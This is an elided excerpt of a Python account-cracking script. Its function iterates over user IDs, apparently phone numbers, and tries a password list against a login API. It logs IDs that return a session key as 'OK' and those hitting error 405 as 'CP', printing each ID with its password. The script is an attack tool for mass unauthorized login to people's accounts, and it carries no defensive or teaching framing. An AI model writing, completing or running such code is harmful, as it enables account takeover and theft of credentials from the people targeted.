...
def bapi(uid,pwx,total):
    ...
    try:
        ...
        first6digit = uid[0:6]
        fullnumber = uid
        sys.stdout.write(f'\r\r[{green} X {white}] {len(cracked)}\{total} - OK\CP {green}{len(oks)}{white}\{rad}{len(cps)}{white}\r\r');sys.stdout.flush()
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uidX not in oks:
                    print(f'{green} [OK] {uidX} | {pw} {white}')
                    oks.append(uidX)
            elif responce_json['error_code'] == 405:
                if uid not in cps:
                    print(f'{rad} [CP] {uid} | {pw} {white}')
                    cps.append(uid)
            else:continue
        cracked.append(uid)
...
if __name__=="__main__":
    #bapi("number", "passwordlist","total_nunber_for_crack")
    print("script ko read kro")
